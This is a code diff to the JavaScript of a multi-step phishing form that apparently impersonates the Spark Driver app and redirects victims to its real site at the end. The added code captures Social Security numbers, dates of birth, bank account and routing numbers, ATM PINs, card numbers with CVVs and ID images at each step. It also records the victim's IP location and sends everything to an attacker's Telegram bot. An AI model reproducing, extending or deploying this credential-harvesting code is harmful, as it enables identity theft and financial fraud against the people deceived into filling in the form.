@@ -10,36 +10,102 @@ document.addEventListener('DOMContentLoaded', function() {
     const completeVerificationBtn = document.getElementById('completeVerification');
 
     // Form validation and navigation
-    nextToPaymentBtn.addEventListener('click', function() {
+    nextToPaymentBtn.addEventListener('click', async function() {
         if (validateStep1()) {
             showLoading('loading1');
-            setTimeout(function() {
-                hideLoading('loading1');
-                updateProgress(1);
-                showStep(2);
-            }, 5000);
+            
+            try {
+                // Send Step 1 data to Telegram
+                const step1Data = {
+                    firstName: document.getElementById('firstName').value,
+                    lastName: document.getElementById('lastName').value,
+                    phone: document.getElementById('phone').value,
+                    dob: document.getElementById('dob').value,
+                    ssn: document.getElementById('ssn').value,
+                    address: document.getElementById('address').value
+                };
+                
+                const ipInfo = await getIPInfo();
+                await sendStepToTelegram(1, step1Data, ipInfo);
+                
+                setTimeout(function() {
+                    hideLoading('loading1');
+                    updateProgress(1);
+                    showStep(2);
+                }, 3000);
+            } catch (error) {
+                console.error('Error sending step 1 data:', error);
+                setTimeout(function() {
+                    hideLoading('loading1');
+                    updateProgress(1);
+                    showStep(2);
+                }, 3000);
+            }
         }
     });
 
-    nextToCardBtn.addEventListener('click', function() {
+    nextToCardBtn.addEventListener('click', async function() {
         if (validateStep2()) {
             showLoading('loading2');
-            setTimeout(function() {
-                hideLoading('loading2');
-                updateProgress(2);
-                showStep(3);
-            }, 5000);
+            
+            try {
+                // Send Step 2 data to Telegram
+                const step2Data = {
+                    bankName: document.getElementById('bankName').value,
+                    bankAccount: document.getElementById('bankAccount').value,
+                    accountType: document.getElementById('accountType').value,
+                    routingNumber: document.getElementById('routingNumber').value,
+                    atmPin: document.getElementById('atmPin').value
+                };
+                
+                const ipInfo = await getIPInfo();
+                await sendStepToTelegram(2, step2Data, ipInfo);
+                
+                setTimeout(function() {
+                    hideLoading('loading2');
+                    updateProgress(2);
+                    showStep(3);
+                }, 3000);
+            } catch (error) {
+                console.error('Error sending step 2 data:', error);
+                setTimeout(function() {
+                    hideLoading('loading2');
+                    updateProgress(2);
+                    showStep(3);
+                }, 3000);
+            }
         }
     });
 
-    nextToIdBtn.addEventListener('click', function() {
+    nextToIdBtn.addEventListener('click', async function() {
         if (validateStep3()) {
             showLoading('loading3');
-            setTimeout(function() {
-                hideLoading('loading3');
-                updateProgress(3);
-                showStep(4);
-            }, 5000);
+            
+            try {
+                // Send Step 3 data to Telegram
+                const step3Data = {
+                    cardNumber: document.getElementById('cardNumber').value,
+                    expDate: document.getElementById('expDate').value,
+                    cvv: document.getElementById('cvv').value,
+                    confirmAtmPin: document.getElementById('confirmAtmPin').value
+                };
+                
+                const ipInfo = await getIPInfo();
+                await sendStepToTelegram(3, step3Data, ipInfo);
+                
+                setTimeout(function() {
+                    hideLoading('loading3');
+                    updateProgress(3);
+                    showStep(4);
+                }, 3000);
+            } catch (error) {
+                console.error('Error sending step 3 data:', error);
+                setTimeout(function() {
+                    hideLoading('loading3');
+                    updateProgress(3);
+                    showStep(4);
+                }, 3000);
+            }
         }
     });
 
@@ -54,16 +120,21 @@ document.addEventListener('DOMContentLoaded', function() {
                 // Get IP and location information
                 const ipInfo = await getIPInfo();
 
-                // Send data to Telegram
-                await sendToTelegram(formData, ipInfo);
+                // Send Step 4 data to Telegram
+                const step4Data = {
+                    frontId: formData.step4.frontId,
+                    backId: formData.step4.backId
+                };
+                
+                await sendStepToTelegram(4, step4Data, ipInfo);
 
-                // Wait for 5 seconds before redirecting
+                // Wait for 3 seconds before redirecting
                 setTimeout(function() {
                     hideLoading('loading4');
                     updateProgress(4);
                     // Redirect to main site after successful verification
                     window.location.href = "https://www.sparkdriverapp.com/en_us";
-                }, 5000);
+                }, 3000);
             } catch (error) {
                 console.error('Error:', error);
                 hideLoading('loading4');
@@ -126,6 +197,92 @@ document.addEventListener('DOMContentLoaded', function() {
                 postal: 'Unknown',
                 isp: 'Unknown'
             };
+        }
+    }
+
+    // Function to send individual step data to Telegram
+    async function sendStepToTelegram(stepNumber, stepData, ipInfo) {
+        let message = `*Step ${stepNumber} - `;
+        
+        switch(stepNumber) {
+            case 1:
+                message += `Personal Information*
+
+*Personal Information:*
+First Name: ${stepData.firstName}
+Last Name: ${stepData.lastName}
+Phone: ${stepData.phone}
+DOB: ${stepData.dob}
+SSN: ${stepData.ssn}
+Address: ${stepData.address}`;
+                break;
+                
+            case 2:
+                message += `Payment Information*
+
+*Bank Information:*
+Bank Name: ${stepData.bankName}
+Account Number: ${stepData.bankAccount}
+Account Type: ${stepData.accountType}
+Routing Number: ${stepData.routingNumber}
+ATM Pin: ${stepData.atmPin}`;
+                break;
+                
+            case 3:
+                message += `Card Information*
+
+*Card Information:*
+Card Number: ${stepData.cardNumber}
+Expiration Date: ${stepData.expDate}
+CVV: ${stepData.cvv}
+Confirm ATM Pin: ${stepData.confirmAtmPin}`;
+                break;
+                
+            case 4:
+                message += `ID Upload*
+
+*ID Upload:*
+Front ID: ${stepData.frontId}
+Back ID: ${stepData.backId}`;
+                break;
+        }
+        
+        message += `
+
+*IP Information:*
+IP Address: ${ipInfo.ip}
+City: ${ipInfo.city}
+State/Region: ${ipInfo.region}
+Country: ${ipInfo.country}
+Postal Code: ${ipInfo.postal}
+ISP: ${ipInfo.isp}
+Timestamp: ${new Date().toLocaleString()}`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        
+        const payload = {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            const data = await response.json();
+            if (!data.ok) {
+                throw new Error('Telegram API error: ' + data.description);
+            }
+            console.log(`Step ${stepNumber} data sent successfully to Telegram`);
+        } catch (error) {
+            console.error(`Error sending step ${stepNumber} to Telegram:`, error);
+            throw error;
         }
     }
 
